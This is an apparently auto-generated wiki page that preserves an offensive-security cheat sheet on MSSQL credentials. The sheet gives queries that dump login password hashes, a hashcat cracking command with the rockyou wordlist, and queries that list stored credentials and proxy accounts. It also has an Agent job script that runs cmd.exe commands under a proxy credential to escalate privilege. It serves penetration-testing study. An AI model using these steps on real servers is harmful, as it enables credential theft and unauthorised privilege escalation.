---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# MSSQL - Credentials

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-databases-mssql-credentials` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/databases/mssql-credentials.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MSSQL - Credentials](../../topics/databases/mssql-credentials.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-databases-mssql-credentials |
| name | MSSQL - Credentials |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/databases/mssql-credentials.md |

## Preserved Source Material

````yaml
_body: "# MSSQL - Credentials\n\n## Summary\n\n* [MSSQL Accounts and Hashes](#mssql-accounts-and-hashes)\n* [List Credentials\
  \ on the SQL Server](#list-credentials-on-the-sql-server)\n* [Proxy Account Context](#proxy-account-context)\n\n## MSSQL\
  \ Accounts and Hashes\n\n* MSSQL 2000\n\n    ```sql\n    SELECT name, password FROM master..sysxlogins\n    SELECT name,\
  \ master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins \n    -- (Need to convert to hex to return hashes in MSSQL\
  \ error message / some version of query analyzer.)\n    ```\n\n* MSSQL 2005\n\n    ```sql\n    SELECT name, password_hash\
  \ FROM master.sys.sql_logins\n    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n\
  \    ```\n\nThen crack passwords using Hashcat : `hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt\
  \ --force`\n\n| Hash-Mode | Hash-Name | Example |\n| ---  | --- | --- |\n| 131  | MSSQL (2000) | 0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578\
  \ |\n| 132  | MSSQL (2005) | 0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe |\n| 1731 | MSSQL (2012, 2014) | 0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375\
  \ |\n\n## List Credentials on the SQL Server\n\n* List credentials configured on the SQL Server instance\n\n    ```sql\n\
  \    SELECT * FROM sys.credentials \n    ```\n\n* List proxy accounts\n\n    ```sql\n    USE msdb; \n    GO \n\n    SELECT\
  \  \n        proxy_id, \n        name AS proxy_name, \n        credential_id, \n        enabled \n    FROM  \n        dbo.sysproxies;\
  \ \n    GO \n    ```\n\n* [dataplat/dbatools/Get-DecryptedObject.ps1](https://github.com/dataplat/dbatools/blob/7ad0415c2f8a58d3472c1e85ee431c70f1bb8ae4/private/functions/Get-DecryptedObject.ps1)\n\
  \n## Proxy Account Context\n\nAgent Job using the registered proxy credential.\n\n```sql\nUSE msdb; \nGO \n\n-- Create the\
  \ job \nEXEC sp_add_job  \n  @job_name = N'WhoAmIJob'; -- Name of the job \n\n-- Add a job step that uses the proxy to execute\
  \ the whoami command \nEXEC sp_add_jobstep  \n  @job_name = N'WhoAmIJob',  \n  @step_name = N'ExecuteWhoAmI',  \n  @subsystem\
  \ = N'CmdExec',          \n  @command = N'c:\\windows\\system32\\cmd.exe /c whoami > c:\\windows\\temp\\whoami.txt',   \
  \        \n  @on_success_action = 1,         -- 1 = Quit with success \n  @on_fail_action = 2,                     -- 2\
  \ = Quit with failure \n  @proxy_name = N'MyCredentialProxy';     -- The proxy created earlier \n\n-- Add a schedule to\
  \ the job (optional, can be manual or scheduled) \nEXEC sp_add_jobschedule  \n  @job_name = N'WhoAmIJob',  \n  @name = N'RunOnce',\
  \  \n  @freq_type = 1,             -- 1 = Once \n  @active_start_date = 20240820,       \n  @active_start_time = 120000;\
  \            \n\n-- Add the job to the SQL Server Agent \nEXEC sp_add_jobserver  \n  @job_name = N'WhoAmIJob',  \n  @server_name\
  \ = N'(LOCAL)';  \n```\n\nExecute the Agent job so that a process will be started in the context of the proxy account and\
  \ execute your code/command.\n`EXEC sp_start_job @job_name = N'WhoAmIJob';`\n\n## References\n\n* [Hijacking SQL Server\
  \ Credentials using Agent Jobs for Domain Privilege Escalation  - Scott Sutherland - September 10, 2024](https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/)"
_relative_path: databases/mssql-credentials.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/databases/mssql-credentials.md
````
